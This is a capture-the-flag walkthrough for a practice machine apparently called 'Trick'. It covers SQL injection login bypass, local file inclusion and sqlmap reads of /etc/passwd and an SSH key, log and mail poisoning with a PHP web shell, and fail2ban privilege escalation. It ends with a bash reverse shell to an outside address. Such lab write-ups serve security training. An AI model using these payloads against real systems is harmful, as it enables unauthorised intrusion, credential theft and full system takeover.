# Attack Path

First enumerate the open ports and services:

```bash
rustscan -a 

sudo nmap -sC -sC -p 22,25,53,80 -oA nmap/trick 10.129.227.180

result:
PORT   STATE SERVICE

```

From weapplyzer we can see the website is using reverse proxies and nginx 1.14.2. We can also query the DNS server to try and find out the domain name:

```bash
> server 10.129.227.180
Default server: 10.129.227.180
Address: 10.129.227.180#53
> 10.129.227.180
180.227.129.10.in-addr.arpa     name = trick.htb.
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.

```

Let’s add the domain name to /etc/hosts. After playing around the website, we find nothing much, just an email field for user to enter and notify. Let’s enumerate for subdomains and subdirectories.

```bash
subdir:

gobuster dir -u http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

subdomain:
ffuf -u http://trick.htb -H "Host: FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 1697
```

We get nothing from both. Attempt to zone transfer:

```bash
dig axfr trick.htb @10.129.227.180

result:
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

We found a new subdomain. Upon visiting it is a login page. We have landed on 

`Admin | Employee's Payroll Management System`. Let’s see if this login is vulnerable to sql injections. We can either do it manually testing it first or we can sql inject it. Let’s try doing it manually. 

```bash
#In the login form

admin' OR 1=1-- -
123
```

We are logged in.

Looking through the website, it seems to be using parameters to load web pages:

![image.png]({{ site.baseurl }}/assets/trick/image.png)

Let’s see if it’s vulnerable to local file inclusion.

We can try fuzzing it with ffuf and jhaddix wordlist:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://preprod-payroll.trick.htb/index.php?page=FUZZ' -fw 1274
```

We see a class:

```bash
<script>
	$('.nav-
/bin/cat /etc/passwd').addClass('active')
</script>

php://filter/read=convert.base64-encode/resource=/etc/passwd
```

This does not work. Let’s try a page that we know exists:

```bash
php://filter/read=convert.base64-encode/resource=deductions
```

We get a base64 response back. It seems like the webpage is adding a .php extension at the end. Let’s read the index.php page:

```bash
php://filter/read=convert.base64-encode/resource=index

result:

....
<?php
	session_start();
  if(!isset($_SESSION['login_id']))
    header('location:login.php');
 include('./header.php'); 
 // include('./auth.php'); 
 ?>
 ....
```

Looking through the code, let’s also get auth.php

```bash
php://filter/read=convert.base64-encode/resource=auth

#It's not here, let's look at login

php://filter/read=convert.base64-encode/resource=login

#this leads us to look at db_connect.php
php://filter/read=convert.base64-encode/resource=db_connect

Now we have credentials for user remo
```

However, we can only do so much with reading php files. Let’s try sqlmap to get read acccess on the system:

```bash
#Check privilege
sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege

result:
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
    
#we can read files
sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/etc/passwd
```

Now read the /etc/passwd file and search for sh to see what users are available on the system.

```bash
grep sh$ /home/billy/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd

result:
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

```

Let’s try sshing with michael. It does not work. Let’s try looking at what other sites are available:

```bash
sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/etc/nginx/sites-enabled/default

less /home/billy/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default

result:

preprod-marketing.trick.htb
root /var/www/market;

sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/home/michael/.ssh/id_rsa
```

Add that to our /etc/hosts.

Now visiting the site it seems like it is also vulnerable to local file inclusion.

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd

#returns us /etc/passwd
```

Next we can check environment variables to see what user is currently running. We should do this in burp as we also need to add the range header:

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//proc/self/envrion

Range: bytes=200-1000

#This did not work, let's try cmdline

http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//proc/self/cmdline

Range: bytes=200-1000

result:
php-fpm: pool michael

#This shows us the webserver itself is running as michael, so we can access his home dir.

http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa

#we get michael's private key.
```

Now let’s log on to michael via ssh, first create the private key file and set the permission to 600

```bash
chmod 600 priv_key
ssh -i priv_key michael@10.129.227.180
```

We are in.

An alternative way to get access to michael’s shell is to exploit access.log and user agent.

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/log/nginx/access.log

#show us the log, scroll to the bottom to see the latest

#Now we can change the user agent to php code make sure not to get this wrong as it could crash the site:
User Agent: <?php system($_GET['cmd']); ?>

#then send the request
#Now adjust the parameters
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/log/nginx/access.log&cmd=id

#Now we can replace the cmd with a reverse shell
#ANnother way is to abuse smtp and send the web shell through mail.
nc -v trick.htb 25
hello trick.htb #test to see if the server is responsive
rcpt to:michael  #or<michael@trick.htb> if it's not local
data
subject: TITLe or something

<?php system($_GET['cmd']) ?>

.  #period to send the mail

#Now we use the LFI vuln
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/spool/mail/michael&cmd=id

#we can now also put a reverse shell here
```

 Checking what sudo privileges we have:

```bash
sudo -l

result:
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

We can edit the fail2ban configurations. Now to find what files we have access to:

```bash
find / -user michael 2>/dev/null | less # Then hit & then ! to do a non-match have to do this everytime when doing a non-match
\/var/www
\/home
...
there is no interesting files that michael has ownership of

#let's check groups
groups

result:
michael security

#Let's see what files the group has ownership of
find / -group security 2>/dev/null | less

result:
/etc/fail2ban/action.d

find / -group security 2>/dev/null -ls | less

result:
we have read/write/executable privilege
```

Now we can change the configurations of fail2ban files. However the files are read only, but because we have ownership of the whole directory, we can:

```bash
cd /etc/fail2ban/action.d
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf

mv iptables.conf iptables.conf.bak
cp iptables.conf.bak iptables.conf
#now we have complete ownership of the file and are able to write to it

Now let's change the action ban so we can execute a reverse shell
vi iptables-multiport.conf  #
vi iptables.conf
#Find actionban
actionban = /dev/shm/shell.sh##

sudo /etc/init.d/fail2ban restart
```

Let’s create file /dev/shm/shell.sh

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.132/9001 0>&1
```

Listening port

```bash
nc -lnvp 9001

```
